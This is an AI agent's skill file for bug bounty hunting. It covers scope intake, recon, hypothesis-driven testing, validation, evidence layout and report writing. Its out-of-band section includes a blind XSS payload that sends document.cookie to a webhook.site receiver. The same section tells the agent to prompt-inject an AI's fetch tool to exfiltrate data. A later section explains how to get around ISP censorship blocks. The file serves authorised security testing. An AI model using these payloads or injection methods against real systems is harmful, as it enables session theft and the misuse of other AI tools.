---
name: bounty-hunt-pipeline
version: 1.0.0
author: ratman4080
license: MIT
description: Hypothesis-driven bug bounty hunting, workspace layout, and reporting.
metadata:
  hermes:
    tags: [bug-bounty, hackerone, recon, web2, web3, pentesting]
    related_skills: [bug-bounty, bb-methodology, triage-validation, report-writing, godmod]
triggers: [bounty, hunt, pipeline, bug-bounty, hackerone, recon, web2, web3, pentesting]
---

# Bounty Hunt Pipeline

## When to Use

Any bug bounty task: picking a target, pulling program scope, recon, hunting specific vuln classes, auditing source code, validating findings, or writing/submission-ready reports. Trigger words: bounty, bug bounty, HackerOne, Immunefi, pentest target, hunt, report a vulnerability.

Hypothesis-driven hunting, not scanner-running. One real, reproducible control failure with clean evidence beats a pile of scanner noise. Every program's hard rules: PoC mandatory, scanner output = spam, theoretical = rejected, self-XSS = rejected, missing headers = rejected.

## Phase 0 — Program Intel

Pull scope via HackerOne public GraphQL before touching anything — the program
page itself is a JS shell, so `curl` of it shows nothing. Full command, fields to
extract, and MSYS scratch-path notes: `references/h1-scope-via-graphql.md`.

**SOURCE_CODE assets are the highest-ROI surface in a crowded program.** They
have near-zero competition from other hunters, are fully offline (no scope-policy
risk from live probes), and map to the highest tier bounties when the code holds
validator keys, consensus logic, or credential-handling primitives. Always check
whether bounty-eligible SOURCE_CODE assets exist before committing to web-surface
hunting on a program with thousands of prior reports.

```python
from curl_cffi import requests as cfreq
s = cfreq.Session(impersonate="chrome", doh_url="https://cloudflare-dns.com/dns-query")
q = {"query": '''{ team(handle: "TARGET") { structured_scopes(first: 100) { edges { node { asset_identifier asset_type eligible_for_bounty eligible_for_submission max_severity instruction } } } minimum_bounty formatted_total_bounties_paid_amount } }'''}
r = s.post("https://hackerone.com/graphql", json=q, timeout=30)
```

Then read their extended policy repo (out-of-scope list + severity definitions). Crypto.com: `crypto-com/h1-policy-guidelines` — AI/KYC bypass, cash-back exploitation, headers/version-info, self-XSS, rate-limit bypass on non-sensitive, <14-day CVEs all excluded.

**Bugcrowd programs have no public scope query — the engagement page *is* the scope document.** `https://bugcrowd.com/engagements/<slug>` extracts server-rendered and unauthenticated, carrying the full target table, a **reward chart per target** (the P1 scale differs per target — rank by target P1, not by P1 in the abstract), per-target exclusions, access notes, and the program-wide out-of-scope list. The extraction exceeds the inline budget, so the TARGETS block lands in the truncated middle: read the saved cache file with offsets rather than trusting the head+tail view, and pull the addresses/repos/hosts out with grep instead of transcribing them. Two rules decide most of the work: **the blanket subdomain clause is literal** (hosts discovered from an in-scope service's own metadata — an OIDC discovery doc, a bundle, a `.mcp.json` — are *not* new scope; record and do not test), and the generic out-of-scope list is a set of pre-answered rejections to copy into the ledger up front. Recipe: `references/bugcrowd-scope-intake.md`.

Target ledger: rank by bounty-eligible, max severity, attack surface, competition. SOURCE_CODE assets with bounty=True are gold — zero competition, fully offline.

## Phase 1 — Security Architect Thinking

Before endpoints, map the trust model: actors (anon/user/staff/admin), objects, roles, state transitions, session lifecycle (issue/refresh/invalidate/upgrade), where authorization is enforced per hop vs only at entry.

Hypothesis format: `In [flow], [control] may not be enforced at [stage] because [observation]. Test: [minimal differential].`

## Phase 2 — Recon Feeding Hypotheses

- Subdomain enum (crt.sh, hackertarget) → group by function, not host
- GitHub org: `/orgs/X/repos?sort=pushed` — recently-pushed non-archived = live surface
- **API doc extraction:** Exchange/fintech API docs are often JS-rendered (`web_extract` returns nav skeleton only). Use `browser_exec` with `goto_url` + `js(innerText)` to get the fully rendered page content. Target changelog, broker, and OAuth sections specifically — they hold the freshest, least-audited attack surface.
- **Batch recon in parallel:** Run `web_search` + `web_extract` + `browser_exec` in the same execute_code call for independent intel sources. Sequential calls are 3-5x slower for the same coverage.
- **Re-verify browser page context and session before each batch of page-context fetches.** Cloud-browser daemon restarts lose the page and the httpOnly session cookie (ephemeral profile), and a lost context surfaces as a URL-parse error while a dead session surfaces as a 401 body — both read as endpoint bugs if misinterpreted. Check `location.origin` plus one authenticated endpoint, re-navigate, and re-login (script the OTP/magic-link loop where the flow allows) instead of debugging the phantom error.
- Devtools dumps from user's browser = ground truth (localStorage leaks feature flags, token formats, API paths; GrowthBook cache leaks rollout configs)
- Local corpora (download once, grep forever):
  - `~/Downloads/bountyforge-hunt/hacktricks/src/` — pentesting-web (170), network-services (198), blockchain, generic-hacking
  - `~/Downloads/bountyforge-hunt/wstg/document/4-Web_Application_Security_Testing/` — 147 tests: AuthZ (8), Session (12), Injection (34), Business Logic (12), Client-side (17), API (7)
  - `~/Downloads/bountyforge-hunt/cve/` — 176K CVEs with PoC refs

## Phase 3 — Hunt Order

1. Business logic + authorization (WSTG-ATHZ, WSTG-BUSLOGIC): ownership, role enforcement at EVERY stage of multi-step flows, session invalidation on role change
2. IDOR: differential test with two controlled accounts
3. Injection only with sink evidence (WSTG-INJV)
4. Client-side: DOM XSS in postMessage, prototype pollution
5. Web3: read ALL sibling functions — missing modifier = the bug (19% of criticals)

**Resolve a deployed EVM address before auditing it** — one Blockscout v2 call
(`<chain>.blockscout.com/api/v2/smart-contracts/{addr}`) returns `name`,
`is_verified`, `proxy_type`, `implementations`, `source_code`, and
`is_changed_bytecode`; then identify unverified ones with `eth_call` selector
probes (`owner()`, `implementation()`, `name()`) and disassemble small proxies.
Recipe: `references/onchain-contract-resolution.md`.

**An MCP server listed as its own asset is an API with a JSON-RPC front end, not a
chatbot.** Handshake the transport (`Accept: application/json, text/event-stream`;
a bare JSON POST gets a 406 that is a transport refusal, not an auth verdict),
enumerate `tools/list`, then use the `scopes_supported` array from the host's
`/.well-known/oauth-protected-resource` as the authz test matrix. Rank its tools by
identifier / URL / mutating arguments. Prompt-injection and LLM-output manipulation
are normally excluded on this asset class, so do not open with them. Recipe:
`references/remote-mcp-server-recon.md`. Mint the wallet JWT for the `Authorization:
Bearer` axis with `references/siwe-wallet-jwt-auth.md` (SIWE → PAT → JWT, no funded
wallet needed).

## Phase 4 — 5-Dimension Gate

| Dimension | Question | Fail → |
|---|---|---|
| Scope | asset + method allowed? | kill immediately |
| Evidence | reproduced? | stays investigation |
| Impact | C-I-A affected? | stays investigation |
| Clarity | triager can replay blind? | rewrite PoC |
| Novelty | distinct root cause? | check disclosed first |

CVSS alone lies. Medium with perfect clarity + impact pays; "critical" theory without reproduction never does.

## Phase 5 — Validation (7-Question Gate, load `triage-validation`)

(1) does code do what I claim (source, not spec)? (2) reachable without special conditions? (3) PoC works? (4) impact per THEIR CIA matrix? (5) in THEIR out-of-scope list? (6) pre-answer the triager's objection (7) root cause theirs?

Differential discipline: baseline vs test response, strip dynamic noise (timestamps, request IDs), keep only semantic deltas.

**A detector built this session needs its own gate before it is trusted.** When a
hunt script or class grows new detection logic, ship it with `--mode selftest`
against built-in fixtures (hermetic, no network) plus a unit-test block, and run
both BEFORE using the output on a live target. Two defects that survive a
green selftest teach the rules:

- **Case-fold both sides of a body match.** Matching a lowercase-normalized
  body against camelCase markers (`minimumLength` vs `minimumlength`) silently
  never fires, and any selftest that asserts on a different marker passes
  anyway. Compare like against like, and assert explicitly on the marker the
  live path depends on.
- **Do not let one noisy signal mark a finding.** A routine 200 on a public
  route is convention, not a vulnerability; a detector that flags every
  body-serving status produces noise a triager sees through. Require an
actionable corroborator — a refused sibling method, or a sensitive body marker
— before emitting anything.

**A parallel audit child's `completed` status is not its artifact.** Audit briefs
die in recon: the child spends its entire budget cloning, grepping and reading,
then returns a one-line intent ("now comparing the verified source") with
`status=completed` and no file on disk — and the parent, reading only the summary,
records the surface as audited. Before treating any delegated audit as done,
`ls -l` the exact artifact path the brief named and check its size; a missing or
tiny file means the surface is unaudited, whatever the status says. Write the
brief so this cannot happen: make step 1 "create the artifact with its section
headings", then append each finding as it is reached, so a mid-run cutoff still
leaves the rulings that were already made. One child per named artifact, and the
brief repeats the artifact path in the goal, in the context, and in the closing
instruction.

**Compile-check with `-W error::ResourceWarning` once before delivery.** An
unclosed file in a parser passes `bash -n`/import checks and only surfaces as
a warning nobody reads; promote it to an error and fix it, so a clean run is
actually clean.

**Verify frontmatter with the delimiter lines.** A SKILL.md missing the `---`
open/close lines registers with a mangled description (the whole
`name: …` line becomes it) and silently breaks discovery; confirm the new skill
appears in `skills_list` with its real description after writing it.

## Killing a hypothesis cheaply (before it costs a session)

A wrong hypothesis is more expensive than a missing one, because it justifies hours of work that cannot succeed. Two checks retire most false ones in one request each.

**A 403 `kind unavailable` / `plan does not allow` is not proof of a paywall — read the account's own state.** Every SaaS exposes its entitlement server-side; query it before building a theory around what you cannot reach:

```
GET /internal/billing/*/account/subscription   -> planType, trialStartDate, trialEndDate
GET /api/v2/plans  or  /internal/plans          -> per-plan limits table
GET .../trial-extension/eligibility             -> {eligible, extensionDays, mode}
```

If the account is already on the highest tier and the feature still 403s, the feature is **retired or tenant-disabled**, not gated — a completely different hunt with a different payoff. Confirming this first would have killed the "reproduce after upgrading" plan outright instead of spending a session on it. State the entitlement verdict in the ledger when you close a surface, so a later session does not re-derive the same wrong theory.

**Byte-identical errors across every body shape AND every auth method mean the edge is rejecting you, not the schema.** Keep a table as you go:

```
same message, body {} / {full} / {wrapped} / {array}   -> not a missing field
same message, session cookie AND real access token     -> not an auth-scope problem
same message, every Content-Type incl. domain-model=   -> not a representation hint
=> WAF / route-level rejection. Stop. Read the client bundle for the real call.
```

Stop after the third variant. The productive move is reading where the frontend actually posts (base path, `LD-API-Version`-style version header, and the exact JSON key names the client builds) — not generating a fourth plausible body. A schema you guessed will never be the one the edge admits.

## Capital-gated payout features (rewards, cashback, claims)

When the juiciest hypothesis is a payout/claim/reward flow that needs balance to exercise, neither record it as blocked nor burn the session guessing at fake accruals. Enumerate the fund-free accrual paths first and verify each closure with a single probe: fake trade/event submission (is the tx broadcast and ownership-checked server-side, or is the recorded amount client-supplied?), bonus/quest completion forgery (does the engine read server-side state or client-controlled settings?), referral credit (does attribution alone mint reward?). Only when every path is verified closed is the feature genuinely capital-gated — then present the user the exact enabler (amount, asset, network, destination address) so a small deposit converts into the full replay/race/voucher-reuse battery, and log the closed paths so a later session does not re-derive them.

## Mobile app teardown — acquire the binary through the user, not through mirror sites

In-scope mobile apps need the binary before anything else (manifest, exported components, JS bridges, hardcoded secrets, deep links). Get it in this order and stop at the first success:

1. **The official store through the user's own browser profile.** The Hermes local browser copies the real Chrome profile only when Chrome is fully quit (a running Chrome holds a profile lock and the session silently falls back to a fresh browser with no logins). If the task needs their Play Store session, ask them to close Chrome once rather than cycling fallbacks.
2. **Ask the user to supply the APK/IPA directly.** One sentence, zero turns burned.
3. **Third-party mirrors as a timeboxed fallback only.** The common APK mirrors are challenge-gated from both cloud and local browser contexts, several aggregator domains are dead, and the Wayback CDX is unreliable — each failed source costs turns, so cap the mirror sweep (a handful of candidates, no re-tries) and fall back to step 1 or 2. Record observed gating as state, not as a permanent verdict: mirrors change.

Prefer the exact store version the program names (programs commonly say "use the App Store version" and treat modified/repackaged binaries as out of scope).

## Tool-hygiene pitfalls (self-inflicted, repeat offenders)

- **Stray spaces inside URLs.** A URL typed with a space after a dot (`apkcombo. app`, `url=host path`) fails with "URL can't contain control characters" or a browser parse error that reads like an endpoint bug. When a fetch/navigate fails on URL parsing, grep the URL string for whitespace before debugging anything else; build URLs programmatically and assert no whitespace before the call.
- **The browser harness screens request bodies and URLs for host-like strings** and blocks them as SSRF before the request leaves. When probing an endpoint that takes a URL/endpoint parameter (webhook, push-subscribe, redirect), use an innocuous public domain (`example.com`) for the probe value instead of a bespoke hostname, or the probe never reaches the target.

## Unauthenticated-perimeter triage (enterprise / defense programs)

A subdomain list is not a target list. Resolve every name first and split by
address family: an A record in RFC1918 space (10/8, 172.16/12, 192.168/16) is an
internal ELB — the TCP connect hangs until timeout, so a sequential sweep spends
the whole cell on hosts that were never reachable. Probe only public-resolvable
hosts and record the private ones as "exists, unreachable" in the ledger.

- Batch probes with `ThreadPoolExecutor` (8–14 workers) and a hard per-request
timeout (6–9 s). A sequential loop over ~40 hosts × 3 paths blows the 300 s
`execute_code` limit and loses the kernel state, including anything already
collected in that call.
- Read the probe JSON's actual field name before filtering it (`status`, not
`code`); a wrong key matches nothing and reads as "no live hosts".
- **Documented example endpoints are usually synthetic.** Resolve a host that
embeds an id (`<id>.<service>.<domain>`) before designing a plan around it. A
dead example does not mean the platform is closed — carry the *pattern*
forward, not the hostname.

**Okta-gated surface: fingerprint the tenant, do not attack it.**
`/.well-known/okta-organization` returns the org id and the real tenant host,
which reveals whether a public proxy fronts an *internal* identity provider. To
decide whether an account-creation path exists at all, read the sign-in widget
config for `registrationEnabledForSignInWidget` — `false` means self-service
registration is off and every signup/reset theory is dead on arrival. Never POST
a registration to test it: creating an account on someone's IdP is an
unauthorized state change, not recon.

**Uniform `403 {"message":"Forbidden"}` with `x-amzn-errortype:
ForbiddenException` on every path and every method = API Gateway resource policy
or source-IP allowlist, not an application auth check.** Nothing behind it is
testable from outside; log the stop-reason and move on instead of enumerating
more paths.

**Two bearer tokens mean two authorization axes — the highest-value unclaimed
test on the surface.** When docs show a per-environment token and a per-account
token in separate headers, tenant scope may be bound to only one of them. Test
token mixing (environment A's token plus account B's token) and object paths
belonging to another environment *before* hunting conventional classes;
dual-token designs are rarely reviewed for cross-tenant enforcement and the
result is a Critical, not a duplicate.

**Exposure without a bypass is Informational.** An internal IdP proxy, a leaked
internal hostname, a version banner, or a public CA/CRL distribution point are
by-design or informational. State the honest severity and park them; inflating
exposure to High is how a report gets closed as informative or duplicate.

## Crowded programs: submit the verified find fast, then define the second wave

On a target that is already heavily hunted, the first valid reproducible report
is the one that pays; every later report of the same root cause closes as a
duplicate. Do not batch a broad audit before submitting a finding that already
passes the 5-dimension gate — validate that one, submit it, then widen. Time
from validation to submission is the variable that matters on these programs.

After a duplicate closure, the second wave changes *target*, not *method*:
re-reading the same subsystem for a variant of the claimed bug re-derives the
same duplication. Ask of every remaining line instead: **which actor reaches
this, and is that actor a stranger or the user?** Privilege crossing is the only
claim that pays, so classify every producer of an input as trusted (root-owned,
shipped with the repo) or stranger-writable (a cloned repo, a downloaded
artifact, a third-party policy file) before spending time on its sinks.

A hunt that finds nothing is complete only when it is written up. Deliver a
status document: the surfaces audited, how each one closed, the candidates that
were rejected with the disqualifying reason, and the surfaces still open. A long
hunt that ends in silence reads as work not done.

## Do not end a session before the submit phase

The standing instruction is to carry an engagement through to a submit-ready
packet, not to stop at recon or analysis with a status summary. Recon, source
audit, on-chain review and live probing are all *mid-engagement* states; the
session ends when either (a) `SUBMISSION_DRAFT.md` plus its `attachments/` exist
for the strongest finding, or (b) a written status document names every surface
audited, how each closed, and which remain open.

A missing credential is not a reason to stop — it is a reason to re-plan around
the surfaces that need no credential (published source, contracts, the
unauthenticated API, the pre-auth bootstrap path of an authenticated service) and
to keep hunting those while the credential path is arranged. Only a hard blocker
ends a session early: a scope wall, a credential that does not exist, or a
vendor-side lockout. When one fires, end with the blocker quoted verbatim, the
tests it invalidated, and the exact next action — never with a plan described in
place of work performed.

## Phase 6 — Report (load `report-writing`)

Title: vuln class + asset + impact. Summary 3 lines. Numbered copy-paste repro steps. PoC as code. Impact in THEIR CIA words. Severity justified, objections pre-answered. Suggested fix. Human tone, no hedging, mask raw tokens in evidence.

## Evidence & Workspace Layout — one folder per target

Preferred layout for every multi-target engagement. The user asked for tidiness
per target; build it at Stage 1, not at the end.

**The work root is designated, not chosen ad hoc.** All engagement work lives
under the single root the user has fixed for this purpose (currently
`D:/security-skill-fixes/`), one folder per engagement. Opening an engagement in
an arbitrary directory (`D:/<name>-hunt/`) splits the trail across the drive and
is precisely what the user flags as untidy — the holding folder must never
become a second, competing root beside the designated one.

**Profile output mirrors that root.** Deliverables also land in the active
profile's `output/` directory as `output/<target>/`, in the same per-target
shape rather than a flat pile of loose files. When master and profile copy both
exist, re-mirror the whole target folder and `diff -r` both directions — the
copy is a snapshot, never a second source of truth.

```
<engagement-root>/
├── README.md                   index: folder map + status table of every candidate
├── FINDINGS.md / CANDIDATES.json / SUBMISSION_PACKET.md   engagement-level ledger
├── <target-host>/
│   ├── SUBMISSION_DRAFT.md      the submittable report for THIS host, VRT-mapped
│   ├── attachments/             every file attached at submit time:
│   │                            verbatim response bodies, verification JSON,
│   │                            the stdout of the stages cited by the draft
│   ├── scripts/                 that host's stage*.py + their *.json
│   └── outputs/                 the same stages' stdout
└── _shared/                    stages that span hosts (scope, baseline, port scan)
```

**Naming is fixed, not per-engagement: `SUBMISSION_DRAFT.md` and `attachments/`
inside every target folder.** The user asked for it by name — one target folder
holds the draft, another folder holds the attachments, exactly like
`crypto/SUBMISSION_DRAFT.md` + `crypto/attachments/`. Do not invent
`<ID>_REPORT.md` per finding and do not leave evidence files loose beside the
draft. `attachments/` carries ONLY what is attached at submit time — not every
stdout the stage produced; the full set stays in `outputs/` and `scripts/`.

**The HEAD of the engagement folder is the program/target name, not the
engagement's codename.** Name the outermost folder after the target the way the
user names it (`underarmour/`, `crypto/`), and nest per-host folders inside it.
An engagement-codename head folder (`ua-engagement/`) fails the completeness
check the user runs: the folder name does not match the target. When such a
folder already exists, rename the HEAD and repatch every path reference in
scripts and drafts, then `grep -r` for the old name to prove zero remain —
stale references survive a move silently and a later run writes to the old
path.

**Create the per-sub-target index skeleton when the first sub-target lands,
not after the hunt.** A target root with only a findings ledger and no index of
its sub-targets reads as an unfinished scratch directory, which is exactly what
the user calls untidy. The index carries the engagement header, one block per
sub-target with its `attachments/` + `scripts/` listing, the engagement-level
doc table, and the read-only scope note.

- Scripts, their JSON, and their stdout never share a directory level — a flat
  stage-keyed pile becomes unnavigable by stage 6.
- Every target folder holds a copy of its own evidence files, so the attachment
  step never cross-references another host's folder.
- Keep rejected and retracted candidates visible in the engagement ledger with
  the reason, so a later session does not re-derive a dead claim.

**Make every script relocatable before the first move, not after.** Hardcoded
absolute paths (`ROOT=/d/<hunt>/repo`) turn relocation into silent breakage —
the script still runs, it just reads the wrong tree and the evidence quietly
goes stale. Derive the root from the script's own location instead:

```bash
HERE=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
HUNT=$(cd -- "$HERE/../../.." && pwd)      # count levels from the script's dir
ROOT="$HUNT/repo"
```

Count the `..` levels against the real directory depth, then VERIFY BY RUNNING
the script — `bash -n` checks syntax only and happily passes a root that
resolves two directories too shallow, which is how a shim ends up writing its
log nowhere. If a script is already hardcoded, patch the constant in every
moved script to its new folder (scripts under `_shared/` keep the shared path),
then re-run ONE script end-to-end and confirm the artifact landed in the new
location.

**Pitfall — attachment paths inside the draft are stale after a restructure.**
Each draft names its own evidence files in its attachment list; those paths are
relative to the target folder. After moving or renaming any folder, grep the
draft for the old paths (`final-evidence/`, `<ID>-...`) and rewrite them to
`attachments/<file>`, so the list a submitter copies from is actually valid.

**Pitfall — the DRAFT is never named for a finding.** Naming the file
`<ID>_REPORT.md` couples the folder to one finding ID; the next finding on the
same host then either stacks into one file or forces a rename. One host, one
`SUBMISSION_DRAFT.md`, whatever the finding count.

**Pitfall — `outputs/` is not the attachment set.** Copy only the stages the
draft actually cites into `attachments/`; leaving every stdout there makes the
submit step attach noise and dilutes the evidence a triager reads.

**Pitfall — `_template/`'s README is the TEMPLATE of the target index, not the
parent tree index.** A template folder is copied verbatim to start the next
engagement; if its README describes the output root, every new target folder
opens with an index documenting the wrong thing. The template README carries the
target's own shape: engagement header, per-sub-target blocks with their
`attachments/` + `scripts/` listing, engagement-level doc table, submit-status
table, and the read-only scope note.

**Pitfall — a mirrored engagement folder drifts; `diff -r` it, don't trust it.**
When a workspace is copied to a second location for tidiness or backup, the copy
is a snapshot: files deleted from the master after the copy was made survive in
the copy, and subfolders created later (`_shared/recon/`, `outputs/`) are
missing entirely, leaving a submission folder with no working trail. Mirror back
the whole target directory, then resolve BOTH directions — entries reported only
in the local copy are stale leftovers to delete, not work to preserve.

**Pitfall — a stray duplicate one level above its folder is invisible in a file
listing.** After any restructure, list the target tree and find every file whose
basename also exists under that target's `scripts/` or `attachments/`; confirm
the two are byte-identical with `sha256sum` before deleting the parent-level
copy, since the pair came from two different output paths rather than a move.

**Carry a verbatim copy in `attachments/` and a relocatable copy in `scripts/`,
and name which is which.** Evidence hashes are pinned in a manifest, so the
attached PoC must stay byte-identical to whatever produced the captured output —
rewriting its paths would invalidate the very hash that proves it. Resolve the
conflict with two copies: the verbatim one in `attachments/` (paths intact,
hash preserved, never edited) and a relocatable one in `scripts/` that is what a
future session actually runs. State the distinction in the manifest by
filename, so nobody reproduces from the wrong file and then reports a
mismatch.

**Move a retracted finding out of the root; do not merely rename it.** A
withdrawn draft sitting beside the live one is one mis-click from being
submitted. Relocate it under `_shared/withdrawn/`, prefix the filename with
`WITHDRAWN`, and record in the engagement ledger both the reason and the
specific test that refuted it — so the dead claim is never re-derived from
scratch by a later session.

## Network Tradecraft (Kominfo-blocked ISPs)

DNS-hijack + SNI-block on :443. Bypass stack:
1. DoH: `cloudflare-dns.com/dns-query?name=X&type=A` + `accept: application/dns-json`
2. **QUIC/HTTP-3 is THE winning path for Cloudflare-fronted hosts**: aioquic (`pip install aioquic`) direct to CF edge IPs on UDP 443 — middlebox is TCP-only. Rig pattern: scratch/rat_h3.py. Requires `:authority` header; brotli for response decompress. **NEVER send content-length on H3 POST to Rails hosts** (CF re-chunks body, Rails 400s plain-text "Bad Request"). Multi set-cookie: H3 client must collect ALL header pairs (dict collapses).
3. **no-SNI TCP for non-Cloudflare hosts (AWS ALB/API GW)**: `ssl.wrap_socket` WITHOUT server_hostname + Host header routes — works when QUIC unavailable (slapi.travel/api.experiences pattern). Middlebox keys on SNI; no SNI = no block.
4. curl_cffi CONNECT_TO alt-ports (8443/2053) — reaches CF edge but strict WAFs (crypto.com) block non-browser TLS anyway. Only for WAF-lenient hosts.
5. User's own Chrome (DoH+ECH) passes — their devtools dumps are ground truth.
6. GraphQL error-message schema walking when introspection is disabled: verbose validation errors (field/type/arg names) substitute for __schema.

## OOB Callback Infra (blind vuln verification)

Blind classes (SSRF, blind XSS, blind SQLi, LLM tool-use exfil, smuggling
confirmation) need an out-of-band receiver BEFORE hunting — triage gates
require a proven callback, not a detection.

Zero-dependency setup that works (webhook.site, programmatic, no auth):
```python
r = httpx.post("https://webhook.site/token", json={"default_status": 200})
uuid = r.json()["uuid"]           # callback URL: https://webhook.site/<uuid>
# poll: GET https://webhook.site/token/<uuid>/requests?sorting=newest
```
Wrap it once as a scratch script exposing: `gen` (fresh tagged URL `?t=<hex>`),
`send` (self-probe), `poll` (list captured), `wait <tag> [secs]` (blocking
poll at ~3s interval). Tag every probe with a unique `?t=` — the tag
attributes a hit to the exact payload that fired and lets concurrent tests
share one endpoint without cross-talk. The receiver captures method, origin
IP, full headers, query params, and body — enough to prove exfil content
(metadata JSON, cookies), not just reachability.

Skip interact.sh's public API registration — it rejects keyless registration
(`failed to parse PEM block containing the key`). webhook.site needs no key.

Usage by class: SSRF → swap the target's URL-fetch param for the tagged URL
and `wait <tag>`; blind XSS → `<script src="https://webhook.site/<uuid>?t=<tag>&c="+document.cookie>`; LLM exfil → prompt-inject the AI's fetch/browse tool to retrieve the tagged URL; smuggling → point the smuggled request at the tagged URL, a hit = confirmed desync.

Ready-made receiver script: `scripts/rat_oob.py` (register / gen / send / poll / wait).

## Hand-rolled authenticated client hygiene

When hunting an authenticated API with your own Python/curl client (no browser), two properties decide whether a whole session of results survives:

**Persist `Set-Cookie` from every response, not just the login.** Step-up / privilege-escalation endpoints rotate the session cookie and return `204` with **no body** — the only signal is `Set-Cookie`. A client that keeps the cookie jar it built at login silently keeps using the stale session, so every gated endpoint keeps answering `escalation_required` and the step-up looks broken when it actually succeeded. Parse `Set-Cookie` off each response and merge it back into the jar before the next call.

**Script a cookie-independent re-login path before touching any session-destroying endpoint.** `revoke-sessions` / `logout-all` / `invalidate-tokens` typically succeed without step-up and kill the current session too. Once that fires, every request returns a misleading auth error and the only recovery is a fresh login — which for many products means a headless browser, a captcha, or a consent flow. Either keep a separate verified jar, or test such endpoints last, or prove re-login works first. Discovering the recovery path *after* the session is dead costs more than the endpoint is worth.

## Source Code Audit — Go/Rust services

When a SOURCE_CODE asset is a Go or Rust service, work these surfaces in order:

1. **Auth boundary**: read the gRPC/HTTP server setup file (often `internal/*/public/public.go`).
   List every `UnaryServerInterceptor` registered. Any service without an auth interceptor is
   unauthenticated by construction — no other code can add authentication after the fact.
   *Pitfall*: different services in the same repo may have different interceptor stacks. Read
   each service's `public.go` independently; do not assume the pattern from one applies to all.
   (In arc-remote-signer: `EnclaveService` has `protovalidatemw`, `SignerService` has none.)

2. **Config audit**: check the production config file (`*production.yaml`, `*prod.yaml`,
   `*.production.json`) for TLS settings. `tls.enabled: false` + `clientAuth.enabled: false`
   on `host: 0.0.0.0` means plaintext on all interfaces. Confirm TLS is opt-in (returns empty
   options on `!enabled`) not fail-closed.

3. **Proto validation gap**: check whether `buf.validate` / `protovalidate` annotations are
   declared in `.proto` but wired up in Go. Pattern: dep in `go.mod` + `protovalidate.New()`
   in service setup + `protovalidatemw.UnaryServerInterceptor` in the chain. If any leg is
   missing, annotations are inert at runtime. A service with validate annotations but no
   interceptor enforces nothing server-side.

4. **Signing path**: for validator/signer services, grep the signing function for domain
   separation. Ed25519: `ed25519.Sign(priv, message)` with no pre-hash and no DST = raw
   signing oracle. BLS: `Sign(key, message, DSTSignature)` = domain-separated (safe).
   Raw Ed25519 signing + no auth = unauthenticated equivocation primitive.

5. **Singleflight / init gates**: search for `singleflight.Group` and `DoChan`/`Do`.
   If the group key is a constant string (not derived from the request payload), concurrent
   callers with different inputs share one execution — the winner's input determines the
   published state. Verify what the existing test suite exercises: `DoChan` with identical
   requests is not the same as with conflicting inputs.

6. **Portable Go toolchain**: when the host lacks Go, download the portable zip from
   `https://go.dev/dl/?mode=json` (first release, windows/amd64/archive). Extract to
   `$TMPDIR/go-portable/go`. Run as `'C:/Users/<user>/AppData/Local/Temp/go-portable/go/bin/go.exe'`
   — pass the Windows-style path, not an MSYS `/c/...` path, or the binary silently fails.
   Set `GOROOT` to the same Windows-style path. Export `GOPATH` and `GOCACHE` under a
   writable drive dir. Set `CGO_ENABLED=0` and `GOPROXY=https://proxy.golang.org,direct`.

7. **Proto codegen**: if `proto/pb/` is not committed, generate it:
   - `protoc` portable zip from `github.com/protocolbuffers/protobuf/releases`
   - `go install google.golang.org/protobuf/cmd/protoc-gen-go@<ver>` into `$GOPATH/bin`
   - `go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@<ver>` into `$GOPATH/bin`
   - `buf/validate/validate.proto` from `bufbuild/protovalidate` on GitHub (raw)
   - Run protoc with `-I. -I<protoc-include-dir>` and both `--go_out` and `--go-grpc_out`
   *Pitfall*: the `--go_opt=module=` value must match the `go_package` option in the `.proto`
   file, not the root module name.

8. **Platform-specific deps**: some packages are Linux-only (e.g. `github.com/hf/nsm` uses
   `syscall.SYS_IOCTL`/`Iovec` absent on Windows). When the package test target fails to
   build cross-platform, extract the logic under test into a self-contained harness: copy the
   key file verbatim, replace only the two Linux-only import paths with stubs, and diff to
   verify. The test then runs on Windows with `CGO_ENABLED=0` and the harness diff proves
   the logic is unmodified.

## Sub-skill load order

godmod → bb-methodology → (web2: bug-bounty / web2-recon / web2-vuln-classes / security-arsenal | web3: web3-start-here chain) → triage-validation → report-writing

Evidence discipline: timestamped repro steps, masked responses, stop-reasons logged. Never log raw secrets.

## Broker OAuth Attack Surface (Crypto Exchanges)

Exchanges with a broker/affiliate program frequently expose a server-to-server OAuth leg (broker backend → exchange API key creation) that is audited far less than the user-facing consent page. The high-value pattern:

1. **Scope/permission injection at API key creation:** The broker POST that creates the user's API key passes a `permissions` or `authGroupMap` object. If the exchange trusts this body without re-verifying against what the user actually authorized in the consent step, an attacker-controlled broker can inject higher permissions (e.g., withdrawal) the user never granted.
2. **`isAddressbookOnly` / address restriction bypass:** Any boolean flag controlling withdrawal destination restriction is a target for forced-false injection.
3. **Refresh token scope escalation:** If the refresh endpoint accepts a broker-supplied `scope` parameter, test passing expanded scopes beyond the original grant.
4. **Dual-phase CSRF:** State param validation is documented as required but often only enforced on the user-facing leg, not the broker-side token exchange.

For KuCoin Fast API OAuth specifically, see `security/bug-bounty` → `references/kucoin-fastapi-oauth.md`.
